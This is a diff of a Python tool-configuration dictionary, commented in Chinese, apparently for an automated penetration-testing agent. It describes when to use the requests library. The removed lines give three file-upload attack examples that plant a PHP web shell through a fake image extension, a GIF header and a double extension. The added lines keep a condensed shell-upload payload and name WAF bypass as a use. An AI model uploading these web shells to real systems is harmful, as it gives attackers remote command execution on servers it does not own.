@@ -7,37 +7,10 @@
 TOOL_SCENARIOS = {
     # ==================== 核心手工测试工具 ====================
     "requests": {
-        "function": "发送HTTP请求，支持GET/POST/文件上传",
-        "best_for": [
-            "文件上传攻击（使用files参数）",
-            "手工验证漏洞、精确控制请求",
-            "绕过WAF/过滤的变形测试"
-        ],
-        "not_for": [
-            "大规模扫描任务",
-            "需要浏览器环境的场景"
-        ],
-        "params_format": {
-            "method": "GET/POST",
-            "url": "目标URL",
-            "headers": {"Header-Name": "value"},
-            "data": "POST请求体",
-            "files": {"字段名": ["文件名", "文件内容", "MIME类型"]}
-        },
-        "file_upload_examples": [
-            {
-                "desc": "上传PHP木马（伪装图片）",
-                "params": {"method": "POST", "url": "http://target/upload.php", "files": {"file": ["shell.jpg", "<?php system($_GET['c']); ?>", "image/jpeg"]}}
-            },
-            {
-                "desc": "上传图片马（真实GIF头）",
-                "params": {"method": "POST", "url": "http://target/upload.php", "files": {"file": ["test.gif", "GIF89a<?php system($_GET['c']); ?>", "image/gif"]}}
-            },
-            {
-                "desc": "双扩展名绕过",
-                "params": {"method": "POST", "url": "http://target/upload.php", "files": {"file": ["shell.php.jpg", "<?php system($_GET['c']); ?>", "image/jpeg"]}}
-            }
-        ],
+        "function": "发送HTTP请求（GET/POST/文件上传）",
+        "best_for": ["文件上传攻击", "手工漏洞验证", "绕过WAF测试"],
+        "file_upload_format": {"method": "POST", "url": "目标URL", "files": {"file": ["文件名", "文件内容", "MIME类型"]}},
+        "example": "上传PHP马: files={'file': ['shell.php', '<?php system($_GET[c]);?>', 'image/jpeg']}",
         "cost": "低"
     },
 
